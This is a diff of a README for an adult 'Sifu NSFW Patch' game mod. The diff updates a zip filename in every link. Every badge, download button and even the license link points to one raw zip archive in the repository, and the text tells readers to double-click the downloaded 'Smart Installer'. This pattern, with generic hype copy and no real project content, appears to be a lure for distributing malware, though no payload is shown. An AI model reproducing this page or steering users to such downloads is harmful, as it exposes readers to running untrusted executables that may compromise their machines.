@@ -1,16 +1,16 @@
 # Sifu NSFW Patch 🎨
 
-![Last Release](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
-![Issues](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
-![Pull Requests](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
-![License](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
-![Downloads](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+![Last Release](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
+![Issues](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
+![Pull Requests](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
+![License](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
+![Downloads](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
 
 Welcome to the **Sifu NSFW Patch**, where artistry meets reinvention! This all-in-one, transformative patch unlocks bold new visual narratives in Sifu, empowering users with fresh perspectives and unmatched customization. Crafted for creators, modders, and the adventure-hungry, this toolkit is your key to reimagining Sifu with a unique expression—effortlessly and with innovation at its core.
 
 ---
 
-[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
 
 ---
 
@@ -87,7 +87,7 @@ Embark on this transformative journey! Installing Sifu NSFW Patch is smoother th
 2. **Download the Latest Patch:**  
    Kick off your adventure by clicking below!
 
-   [![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+   [![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
 
 3. **Run the Smart Installer:**  
    Just double-click the file you downloaded. The installer will check compatibility, auto-back up your originals, and guide you with on-screen prompts.
@@ -119,13 +119,13 @@ All AI integration features are optional and require user-provided API keys. No 
 
 ## 📜 MIT License
 
-This project is licensed under the MIT License. See [LICENSE](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip) for details.  
+This project is licensed under the MIT License. See [LICENSE](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip) for details.  
 © 2025 Sifu NSFW Patch. Build, share, and remix with confidence.
 
 ---
 
 ## ✨ Ready to Transform Your Sifu Experience?
 
-[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_nsfw_sifu_2.3.zip)
 
 Reimagine. Rediscover. Redefine—Sifu, your way.
